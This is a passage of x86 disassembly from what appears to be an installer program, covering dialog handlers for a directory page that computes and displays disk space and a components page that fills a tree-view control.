  40423a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404241:	75 72                	jne    0x4042b5
  404243:	8b 7d 08             	mov    0x8(%ebp),%edi
  404246:	53                   	push   %ebx
  404247:	57                   	push   %edi
  404248:	ff 15 2c 72 40 00    	call   *0x40722c
  40424e:	56                   	push   %esi
  40424f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404252:	e8 15 13 00 00       	call   0x40556c
  404257:	85 c0                	test   %eax,%eax
  404259:	74 10                	je     0x40426b
  40425b:	56                   	push   %esi
  40425c:	e8 32 13 00 00       	call   0x405593
  404261:	85 c0                	test   %eax,%eax
  404263:	75 06                	jne    0x40426b
  404265:	56                   	push   %esi
  404266:	e8 94 12 00 00       	call   0x4054ff
  40426b:	56                   	push   %esi
  40426c:	89 3d 38 db 44 00    	mov    %edi,0x44db38
  404272:	ff 75 f8             	push   -0x8(%ebp)
  404275:	ff 15 f4 71 40 00    	call   *0x4071f4
  40427b:	8b 45 14             	mov    0x14(%ebp),%eax
  40427e:	ff 70 34             	push   0x34(%eax)
  404281:	6a 01                	push   $0x1
  404283:	57                   	push   %edi
  404284:	e8 35 fb ff ff       	call   0x403dbe
  404289:	8b 45 14             	mov    0x14(%ebp),%eax
  40428c:	ff 70 30             	push   0x30(%eax)
  40428f:	6a 14                	push   $0x14
  404291:	57                   	push   %edi
  404292:	e8 27 fb ff ff       	call   0x403dbe
  404297:	ff 75 f8             	push   -0x8(%ebp)
  40429a:	e8 54 fb ff ff       	call   0x403df3
  40429f:	6a 07                	push   $0x7
  4042a1:	e8 88 1a 00 00       	call   0x405d2e
  4042a6:	85 c0                	test   %eax,%eax
  4042a8:	0f 84 6e 02 00 00    	je     0x40451c
  4042ae:	6a 01                	push   $0x1
  4042b0:	ff 75 f8             	push   -0x8(%ebp)
  4042b3:	ff d0                	call   *%eax
  4042b5:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4042bc:	0f 85 cf 00 00 00    	jne    0x404391
  4042c2:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4042c6:	3b c3                	cmp    %ebx,%eax
  4042c8:	75 18                	jne    0x4042e2
  4042ca:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4042cd:	c1 e9 10             	shr    $0x10,%ecx
  4042d0:	66 81 f9 00 03       	cmp    $0x300,%cx
  4042d5:	0f 85 41 02 00 00    	jne    0x40451c
  4042db:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4042e2:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  4042e7:	0f 85 a4 00 00 00    	jne    0x404391
  4042ed:	6a 07                	push   $0x7
  4042ef:	33 c0                	xor    %eax,%eax
  4042f1:	59                   	pop    %ecx
  4042f2:	8d 7d bc             	lea    -0x44(%ebp),%edi
  4042f5:	ff 75 fc             	push   -0x4(%ebp)
  4042f8:	f3 ab                	rep stos %eax,%es:(%edi)
  4042fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4042fd:	bf e0 b7 43 00       	mov    $0x43b7e0,%edi
  404302:	68 b0 57 43 00       	push   $0x4357b0
  404307:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40430a:	89 7d c0             	mov    %edi,-0x40(%ebp)
  40430d:	c7 45 cc 31 45 40 00 	movl   $0x404531,-0x34(%ebp)
  404314:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404317:	e8 12 17 00 00       	call   0x405a2e
  40431c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40431f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404322:	50                   	push   %eax
  404323:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
  40432a:	ff 15 54 71 40 00    	call   *0x407154
  404330:	85 c0                	test   %eax,%eax
  404332:	74 56                	je     0x40438a
  404334:	50                   	push   %eax
  404335:	ff 15 78 72 40 00    	call   *0x407278
  40433b:	56                   	push   %esi
  40433c:	e8 be 11 00 00       	call   0x4054ff
  404341:	a1 70 1b 45 00       	mov    0x451b70,%eax
  404346:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40434c:	85 c0                	test   %eax,%eax
  40434e:	74 28                	je     0x404378
  404350:	81 fe 00 c0 47 00    	cmp    $0x47c000,%esi
  404356:	75 20                	jne    0x404378
  404358:	50                   	push   %eax
  404359:	6a 00                	push   $0x0
  40435b:	e8 ce 16 00 00       	call   0x405a2e
  404360:	57                   	push   %edi
  404361:	bf 00 9b 44 00       	mov    $0x449b00,%edi
  404366:	57                   	push   %edi
  404367:	ff 15 f0 70 40 00    	call   *0x4070f0
  40436d:	85 c0                	test   %eax,%eax
  40436f:	74 07                	je     0x404378
  404371:	57                   	push   %edi
  404372:	56                   	push   %esi
  404373:	e8 b0 16 00 00       	call   0x405a28
  404378:	ff 05 cc b7 43 00    	incl   0x43b7cc
  40437e:	56                   	push   %esi
  40437f:	53                   	push   %ebx
  404380:	ff 75 08             	push   0x8(%ebp)
  404383:	e8 23 0f 00 00       	call   0x4052ab
  404388:	eb 07                	jmp    0x404391
  40438a:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404391:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404398:	74 0d                	je     0x4043a7
  40439a:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4043a1:	0f 85 75 01 00 00    	jne    0x40451c
  4043a7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4043ab:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4043af:	56                   	push   %esi
  4043b0:	53                   	push   %ebx
  4043b1:	e8 fb 0e 00 00       	call   0x4052b1
  4043b6:	56                   	push   %esi
  4043b7:	e8 24 12 00 00       	call   0x4055e0
  4043bc:	85 c0                	test   %eax,%eax
  4043be:	75 07                	jne    0x4043c7
  4043c0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4043c7:	bf a8 37 43 00       	mov    $0x4337a8,%edi
  4043cc:	56                   	push   %esi
  4043cd:	57                   	push   %edi
  4043ce:	e8 39 16 00 00       	call   0x405a0c
  4043d3:	33 db                	xor    %ebx,%ebx
  4043d5:	53                   	push   %ebx
  4043d6:	e8 53 19 00 00       	call   0x405d2e
  4043db:	3b c3                	cmp    %ebx,%eax
  4043dd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4043e0:	74 35                	je     0x404417
  4043e2:	33 c0                	xor    %eax,%eax
  4043e4:	3b c7                	cmp    %edi,%eax
  4043e6:	74 2d                	je     0x404415
  4043e8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4043eb:	50                   	push   %eax
  4043ec:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4043ef:	50                   	push   %eax
  4043f0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4043f3:	50                   	push   %eax
  4043f4:	57                   	push   %edi
  4043f5:	ff 55 f4             	call   *-0xc(%ebp)
  4043f8:	85 c0                	test   %eax,%eax
  4043fa:	75 6c                	jne    0x404468
  4043fc:	85 db                	test   %ebx,%ebx
  4043fe:	74 03                	je     0x404403
  404400:	66 21 03             	and    %ax,(%ebx)
  404403:	57                   	push   %edi
  404404:	e8 3d 11 00 00       	call   0x405546
  404409:	8b d8                	mov    %eax,%ebx
  40440b:	4b                   	dec    %ebx
  40440c:	3b df                	cmp    %edi,%ebx
  40440e:	66 c7 03 5c 00       	movw   $0x5c,(%ebx)
  404413:	75 d3                	jne    0x4043e8
  404415:	33 db                	xor    %ebx,%ebx
  404417:	56                   	push   %esi
  404418:	57                   	push   %edi
  404419:	e8 ee 15 00 00       	call   0x405a0c
  40441e:	57                   	push   %edi
  40441f:	e8 6f 11 00 00       	call   0x405593
  404424:	3b c3                	cmp    %ebx,%eax
  404426:	74 03                	je     0x40442b
  404428:	80 20 00             	andb   $0x0,(%eax)
  40442b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40442e:	50                   	push   %eax
  40442f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404432:	50                   	push   %eax
  404433:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404436:	50                   	push   %eax
  404437:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40443a:	50                   	push   %eax
  40443b:	57                   	push   %edi
  40443c:	ff 15 bc 70 40 00    	call   *0x4070bc
  404442:	85 c0                	test   %eax,%eax
  404444:	74 3a                	je     0x404480
  404446:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404449:	be 00 04 00 00       	mov    $0x400,%esi
  40444e:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  404452:	56                   	push   %esi
  404453:	ff 75 f4             	push   -0xc(%ebp)
  404456:	50                   	push   %eax
  404457:	ff 15 30 71 40 00    	call   *0x407130
  40445d:	8b f8                	mov    %eax,%edi
  40445f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404466:	eb 20                	jmp    0x404488
  404468:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40446b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40446e:	0f ac c7 0a          	shrd   $0xa,%eax,%edi
  404472:	c1 e8 0a             	shr    $0xa,%eax
  404475:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40447c:	33 db                	xor    %ebx,%ebx
  40447e:	eb 03                	jmp    0x404483
  404480:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404483:	be 00 04 00 00       	mov    $0x400,%esi
  404488:	6a 05                	push   $0x5
  40448a:	e8 bd 01 00 00       	call   0x40464c
  40448f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  404492:	74 0b                	je     0x40449f
  404494:	3b f8                	cmp    %eax,%edi
  404496:	73 07                	jae    0x40449f
  404498:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40449f:	8b 0d 3c db 44 00    	mov    0x44db3c,%ecx
  4044a5:	39 59 10             	cmp    %ebx,0x10(%ecx)
  4044a8:	74 2b                	je     0x4044d5
  4044aa:	50                   	push   %eax
  4044ab:	6a fb                	push   $0xfffffffb
  4044ad:	68 ff 03 00 00       	push   $0x3ff
  4044b2:	e8 e0 00 00 00       	call   0x404597
  4044b7:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4044ba:	74 0b                	je     0x4044c7
  4044bc:	57                   	push   %edi
  4044bd:	6a fc                	push   $0xfffffffc
  4044bf:	56                   	push   %esi
  4044c0:	e8 d2 00 00 00       	call   0x404597
  4044c5:	eb 0e                	jmp    0x4044d5
  4044c7:	68 98 37 43 00       	push   $0x433798
  4044cc:	56                   	push   %esi
  4044cd:	ff 75 08             	push   0x8(%ebp)
  4044d0:	e8 d6 0d 00 00       	call   0x4052ab
  4044d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044d8:	3b c3                	cmp    %ebx,%eax
  4044da:	a3 04 1c 45 00       	mov    %eax,0x451c04
  4044df:	75 0a                	jne    0x4044eb
  4044e1:	6a 07                	push   $0x7
  4044e3:	e8 23 cf ff ff       	call   0x40140b
  4044e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044eb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4044ee:	85 70 14             	test   %esi,0x14(%eax)
  4044f1:	74 03                	je     0x4044f6
  4044f3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4044f6:	33 c0                	xor    %eax,%eax
  4044f8:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4044fb:	0f 94 c0             	sete   %al
  4044fe:	50                   	push   %eax
  4044ff:	e8 dc f8 ff ff       	call   0x403de0
  404504:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  404507:	75 0d                	jne    0x404516
  404509:	39 1d cc b7 43 00    	cmp    %ebx,0x43b7cc
  40450f:	75 05                	jne    0x404516
  404511:	e8 7b fc ff ff       	call   0x404191
  404516:	89 1d cc b7 43 00    	mov    %ebx,0x43b7cc
  40451c:	ff 75 14             	push   0x14(%ebp)
  40451f:	ff 75 10             	push   0x10(%ebp)
  404522:	ff 75 0c             	push   0xc(%ebp)
  404525:	e8 fb f8 ff ff       	call   0x403e25
  40452a:	5f                   	pop    %edi
  40452b:	5e                   	pop    %esi
  40452c:	5b                   	pop    %ebx
  40452d:	c9                   	leave
  40452e:	c2 10 00             	ret    $0x10
  404531:	55                   	push   %ebp
  404532:	8b ec                	mov    %esp,%ebp
  404534:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404538:	56                   	push   %esi
  404539:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40453f:	75 1c                	jne    0x40455d
  404541:	ff 75 14             	push   0x14(%ebp)
  404544:	68 fb 03 00 00       	push   $0x3fb
  404549:	e8 63 0d 00 00       	call   0x4052b1
  40454e:	ff 75 14             	push   0x14(%ebp)
  404551:	6a 01                	push   $0x1
  404553:	68 66 04 00 00       	push   $0x466
  404558:	ff 75 08             	push   0x8(%ebp)
  40455b:	ff d6                	call   *%esi
  40455d:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404561:	75 2d                	jne    0x404590
  404563:	ff 75 14             	push   0x14(%ebp)
  404566:	ff 75 10             	push   0x10(%ebp)
  404569:	ff 15 50 71 40 00    	call   *0x407150
  40456f:	85 c0                	test   %eax,%eax
  404571:	74 0e                	je     0x404581
  404573:	6a 07                	push   $0x7
  404575:	e8 91 ce ff ff       	call   0x40140b
  40457a:	85 c0                	test   %eax,%eax
  40457c:	75 03                	jne    0x404581
  40457e:	40                   	inc    %eax
  40457f:	eb 02                	jmp    0x404583
  404581:	33 c0                	xor    %eax,%eax
  404583:	50                   	push   %eax
  404584:	6a 00                	push   $0x0
  404586:	68 65 04 00 00       	push   $0x465
  40458b:	ff 75 08             	push   0x8(%ebp)
  40458e:	ff d6                	call   *%esi
  404590:	33 c0                	xor    %eax,%eax
  404592:	5e                   	pop    %esi
  404593:	5d                   	pop    %ebp
  404594:	c2 10 00             	ret    $0x10
  404597:	55                   	push   %ebp
  404598:	8b ec                	mov    %esp,%ebp
  40459a:	83 ec 40             	sub    $0x40,%esp
  40459d:	53                   	push   %ebx
  40459e:	56                   	push   %esi
  40459f:	8b 75 10             	mov    0x10(%ebp),%esi
  4045a2:	57                   	push   %edi
  4045a3:	6a 14                	push   $0x14
  4045a5:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4045ab:	5f                   	pop    %edi
  4045ac:	6a dc                	push   $0xffffffdc
  4045ae:	5b                   	pop    %ebx
  4045af:	73 06                	jae    0x4045b7
  4045b1:	6a 0a                	push   $0xa
  4045b3:	5f                   	pop    %edi
  4045b4:	6a dd                	push   $0xffffffdd
  4045b6:	5b                   	pop    %ebx
  4045b7:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  4045bd:	73 05                	jae    0x4045c4
  4045bf:	6a de                	push   $0xffffffde
  4045c1:	33 ff                	xor    %edi,%edi
  4045c3:	5b                   	pop    %ebx
  4045c4:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  4045ca:	73 0f                	jae    0x4045db
  4045cc:	33 c0                	xor    %eax,%eax
  4045ce:	8b cf                	mov    %edi,%ecx
  4045d0:	40                   	inc    %eax
  4045d1:	6a 14                	push   $0x14
  4045d3:	d3 e0                	shl    %cl,%eax
  4045d5:	59                   	pop    %ecx
  4045d6:	99                   	cltd
  4045d7:	f7 f9                	idiv   %ecx
  4045d9:	03 f0                	add    %eax,%esi
  4045db:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4045de:	6a df                	push   $0xffffffdf
  4045e0:	50                   	push   %eax
  4045e1:	e8 48 14 00 00       	call   0x405a2e
  4045e6:	50                   	push   %eax
  4045e7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4045ea:	53                   	push   %ebx
  4045eb:	50                   	push   %eax
  4045ec:	e8 3d 14 00 00       	call   0x405a2e
  4045f1:	50                   	push   %eax
  4045f2:	8b c6                	mov    %esi,%eax
  4045f4:	25 ff ff ff 00       	and    $0xffffff,%eax
  4045f9:	8b cf                	mov    %edi,%ecx
  4045fb:	6a 0a                	push   $0xa
  4045fd:	33 d2                	xor    %edx,%edx
  4045ff:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404602:	03 c0                	add    %eax,%eax
  404604:	d3 e8                	shr    %cl,%eax
  404606:	59                   	pop    %ecx
  404607:	f7 f1                	div    %ecx
  404609:	8b cf                	mov    %edi,%ecx
  40460b:	d3 ee                	shr    %cl,%esi
  40460d:	52                   	push   %edx
  40460e:	56                   	push   %esi
  40460f:	68 cc 91 40 00       	push   $0x4091cc
  404614:	be e0 b7 43 00       	mov    $0x43b7e0,%esi
  404619:	ff 75 0c             	push   0xc(%ebp)
  40461c:	56                   	push   %esi
  40461d:	e8 0c 14 00 00       	call   0x405a2e
  404622:	56                   	push   %esi
  404623:	8b f8                	mov    %eax,%edi
  404625:	e8 f8 13 00 00       	call   0x405a22
  40462a:	03 f8                	add    %eax,%edi
  40462c:	57                   	push   %edi
  40462d:	ff 15 00 72 40 00    	call   *0x407200
  404633:	83 c4 18             	add    $0x18,%esp
  404636:	56                   	push   %esi
  404637:	ff 75 08             	push   0x8(%ebp)
  40463a:	ff 35 38 db 44 00    	push   0x44db38
  404640:	e8 66 0c 00 00       	call   0x4052ab
  404645:	5f                   	pop    %edi
  404646:	5e                   	pop    %esi
  404647:	5b                   	pop    %ebx
  404648:	c9                   	leave
  404649:	c2 0c 00             	ret    $0xc
  40464c:	8b 15 8c 1b 45 00    	mov    0x451b8c,%edx
  404652:	8b 0d 88 1b 45 00    	mov    0x451b88,%ecx
  404658:	33 c0                	xor    %eax,%eax
  40465a:	85 d2                	test   %edx,%edx
  40465c:	74 18                	je     0x404676
  40465e:	56                   	push   %esi
  40465f:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404663:	74 07                	je     0x40466c
  404665:	8b 74 24 08          	mov    0x8(%esp),%esi
  404669:	03 04 b1             	add    (%ecx,%esi,4),%eax
  40466c:	81 c1 18 20 00 00    	add    $0x2018,%ecx
  404672:	4a                   	dec    %edx
  404673:	75 ea                	jne    0x40465f
  404675:	5e                   	pop    %esi
  404676:	c2 04 00             	ret    $0x4
  404679:	55                   	push   %ebp
  40467a:	8b ec                	mov    %esp,%ebp
  40467c:	83 ec 38             	sub    $0x38,%esp
  40467f:	56                   	push   %esi
  404680:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404686:	57                   	push   %edi
  404687:	8b 7d 08             	mov    0x8(%ebp),%edi
  40468a:	6a 00                	push   $0x0
  40468c:	6a 09                	push   $0x9
  40468e:	68 0a 11 00 00       	push   $0x110a
  404693:	57                   	push   %edi
  404694:	ff d6                	call   *%esi
  404696:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40469a:	74 3c                	je     0x4046d8
  40469c:	ff 15 a0 71 40 00    	call   *0x4071a0
  4046a2:	0f bf c8             	movswl %ax,%ecx
  4046a5:	c1 e8 10             	shr    $0x10,%eax
  4046a8:	0f bf c0             	movswl %ax,%eax
  4046ab:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4046ae:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046b1:	50                   	push   %eax
  4046b2:	57                   	push   %edi
  4046b3:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4046b6:	ff 15 70 71 40 00    	call   *0x407170
  4046bc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046bf:	50                   	push   %eax
  4046c0:	6a 00                	push   $0x0
  4046c2:	68 11 11 00 00       	push   $0x1111
  4046c7:	57                   	push   %edi
  4046c8:	ff d6                	call   *%esi
  4046ca:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  4046ce:	75 05                	jne    0x4046d5
  4046d0:	83 c8 ff             	or     $0xffffffff,%eax
  4046d3:	eb 1e                	jmp    0x4046f3
  4046d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046d8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046db:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4046de:	50                   	push   %eax
  4046df:	6a 00                	push   $0x0
  4046e1:	68 0c 11 00 00       	push   $0x110c
  4046e6:	57                   	push   %edi
  4046e7:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4046ee:	ff d6                	call   *%esi
  4046f0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046f3:	5f                   	pop    %edi
  4046f4:	5e                   	pop    %esi
  4046f5:	c9                   	leave
  4046f6:	c2 08 00             	ret    $0x8
  4046f9:	55                   	push   %ebp
  4046fa:	8b ec                	mov    %esp,%ebp
  4046fc:	83 ec 50             	sub    $0x50,%esp
  4046ff:	53                   	push   %ebx
  404700:	56                   	push   %esi
  404701:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  404707:	57                   	push   %edi
  404708:	68 f9 03 00 00       	push   $0x3f9
  40470d:	ff 75 08             	push   0x8(%ebp)
  404710:	ff d6                	call   *%esi
  404712:	68 08 04 00 00       	push   $0x408
  404717:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40471a:	ff 75 08             	push   0x8(%ebp)
  40471d:	ff d6                	call   *%esi
  40471f:	8b 1d 88 1b 45 00    	mov    0x451b88,%ebx
  404725:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40472b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40472e:	a1 70 1b 45 00       	mov    0x451b70,%eax
  404733:	05 94 00 00 00       	add    $0x94,%eax
  404738:	33 ff                	xor    %edi,%edi
  40473a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404741:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404744:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404747:	0f 85 22 02 00 00    	jne    0x40496f
  40474d:	8b 45 08             	mov    0x8(%ebp),%eax
  404750:	6a 02                	push   $0x2
  404752:	a3 c0 1b 45 00       	mov    %eax,0x451bc0
  404757:	a1 8c 1b 45 00       	mov    0x451b8c,%eax
  40475c:	5b                   	pop    %ebx
  40475d:	89 7d e8             	mov    %edi,-0x18(%ebp)
  404760:	c1 e0 02             	shl    $0x2,%eax
  404763:	50                   	push   %eax
  404764:	6a 40                	push   $0x40
  404766:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404769:	ff 15 00 71 40 00    	call   *0x407100
  40476f:	6a 6e                	push   $0x6e
  404771:	a3 d4 b7 43 00       	mov    %eax,0x43b7d4
  404776:	ff 35 60 1b 45 00    	push   0x451b60
  40477c:	ff 15 a4 71 40 00    	call   *0x4071a4
  404782:	83 0d c8 b7 43 00 ff 	orl    $0xffffffff,0x43b7c8
  404789:	68 fa 4c 40 00       	push   $0x404cfa
  40478e:	6a fc                	push   $0xfffffffc
  404790:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404793:	ff 75 fc             	push   -0x4(%ebp)
  404796:	ff 15 30 72 40 00    	call   *0x407230
  40479c:	57                   	push   %edi
  40479d:	6a 06                	push   $0x6
  40479f:	6a 21                	push   $0x21
  4047a1:	6a 10                	push   $0x10
  4047a3:	6a 10                	push   $0x10
  4047a5:	a3 d0 b7 43 00       	mov    %eax,0x43b7d0
  4047aa:	ff 15 34 70 40 00    	call   *0x407034
  4047b0:	68 ff 00 ff 00       	push   $0xff00ff
  4047b5:	a3 bc b7 43 00       	mov    %eax,0x43b7bc
  4047ba:	ff 75 ec             	push   -0x14(%ebp)
  4047bd:	50                   	push   %eax
  4047be:	ff 15 28 70 40 00    	call   *0x407028
  4047c4:	ff 35 bc b7 43 00    	push   0x43b7bc
  4047ca:	53                   	push   %ebx
  4047cb:	68 09 11 00 00       	push   $0x1109
  4047d0:	ff 75 fc             	push   -0x4(%ebp)
  4047d3:	ff d6                	call   *%esi
  4047d5:	57                   	push   %edi
  4047d6:	57                   	push   %edi
  4047d7:	68 1c 11 00 00       	push   $0x111c
  4047dc:	ff 75 fc             	push   -0x4(%ebp)
  4047df:	ff d6                	call   *%esi
  4047e1:	83 f8 10             	cmp    $0x10,%eax
  4047e4:	7d 0d                	jge    0x4047f3
  4047e6:	57                   	push   %edi
  4047e7:	6a 10                	push   $0x10
  4047e9:	68 1b 11 00 00       	push   $0x111b
  4047ee:	ff 75 fc             	push   -0x4(%ebp)
  4047f1:	ff d6                	call   *%esi
  4047f3:	ff 75 ec             	push   -0x14(%ebp)
  4047f6:	ff 15 44 70 40 00    	call   *0x407044
  4047fc:	33 db                	xor    %ebx,%ebx
  4047fe:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404801:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  404804:	3b c7                	cmp    %edi,%eax
  404806:	74 27                	je     0x40482f
  404808:	83 fb 20             	cmp    $0x20,%ebx
  40480b:	74 03                	je     0x404810
  40480d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404810:	50                   	push   %eax
  404811:	57                   	push   %edi
  404812:	e8 17 12 00 00       	call   0x405a2e
  404817:	50                   	push   %eax
  404818:	57                   	push   %edi
  404819:	68 43 01 00 00       	push   $0x143
  40481e:	ff 75 f8             	push   -0x8(%ebp)
  404821:	ff d6                	call   *%esi
  404823:	53                   	push   %ebx
  404824:	50                   	push   %eax
  404825:	68 51 01 00 00       	push   $0x151
  40482a:	ff 75 f8             	push   -0x8(%ebp)
  40482d:	ff d6                	call   *%esi
  40482f:	43                   	inc    %ebx
  404830:	83 fb 21             	cmp    $0x21,%ebx
  404833:	7c c9                	jl     0x4047fe
  404835:	8b 7d 14             	mov    0x14(%ebp),%edi
  404838:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40483b:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  40483f:	6a 15                	push   $0x15
  404841:	ff 75 08             	push   0x8(%ebp)
  404844:	e8 75 f5 ff ff       	call   0x403dbe
  404849:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  40484d:	6a 16                	push   $0x16
  40484f:	ff 75 08             	push   0x8(%ebp)
  404852:	e8 67 f5 ff ff       	call   0x403dbe
  404857:	33 ff                	xor    %edi,%edi
  404859:	33 db                	xor    %ebx,%ebx
  40485b:	39 3d 8c 1b 45 00    	cmp    %edi,0x451b8c
  404861:	0f 8e c4 00 00 00    	jle    0x40492b
  404867:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40486a:	8d 50 08             	lea    0x8(%eax),%edx
  40486d:	89 55 ec             	mov    %edx,-0x14(%ebp)
  404870:	8d 42 10             	lea    0x10(%edx),%eax
  404873:	80 38 00             	cmpb   $0x0,(%eax)
  404876:	0f 84 90 00 00 00    	je     0x40490c
  40487c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40487f:	8b 02                	mov    (%edx),%eax
  404881:	6a 20                	push   $0x20
  404883:	8b d0                	mov    %eax,%edx
  404885:	59                   	pop    %ecx
  404886:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  404889:	23 d1                	and    %ecx,%edx
  40488b:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404892:	a8 02                	test   $0x2,%al
  404894:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  40489b:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40489e:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4048a1:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4048a4:	74 38                	je     0x4048de
  4048a6:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048a9:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  4048b0:	50                   	push   %eax
  4048b1:	6a 00                	push   $0x0
  4048b3:	68 00 11 00 00       	push   $0x1100
  4048b8:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  4048bf:	ff 75 fc             	push   -0x4(%ebp)
  4048c2:	ff d6                	call   *%esi
  4048c4:	8b 0d d4 b7 43 00    	mov    0x43b7d4,%ecx
  4048ca:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  4048d1:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4048d4:	a1 d4 b7 43 00       	mov    0x43b7d4,%eax
  4048d9:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  4048dc:	eb 2e                	jmp    0x40490c
  4048de:	a8 04                	test   $0x4,%al
  4048e0:	74 11                	je     0x4048f3
  4048e2:	53                   	push   %ebx
  4048e3:	6a 03                	push   $0x3
  4048e5:	68 0a 11 00 00       	push   $0x110a
  4048ea:	ff 75 fc             	push   -0x4(%ebp)
  4048ed:	ff d6                	call   *%esi
  4048ef:	8b d8                	mov    %eax,%ebx
  4048f1:	eb 19                	jmp    0x40490c
  4048f3:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048f6:	50                   	push   %eax
  4048f7:	6a 00                	push   $0x0
  4048f9:	68 00 11 00 00       	push   $0x1100
  4048fe:	ff 75 fc             	push   -0x4(%ebp)
  404901:	ff d6                	call   *%esi
  404903:	8b 0d d4 b7 43 00    	mov    0x43b7d4,%ecx
  404909:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  40490c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40490f:	47                   	inc    %edi
  404910:	81 c2 18 20 00 00    	add    $0x2018,%edx
  404916:	3b 3d 8c 1b 45 00    	cmp    0x451b8c,%edi
  40491c:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40491f:	0f 8c 4b ff ff ff    	jl     0x404870
  404925:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404929:	75 19                	jne    0x404944
  40492b:	6a f0                	push   $0xfffffff0
  40492d:	ff 75 fc             	push   -0x4(%ebp)
  404930:	ff 15 90 71 40 00    	call   *0x407190
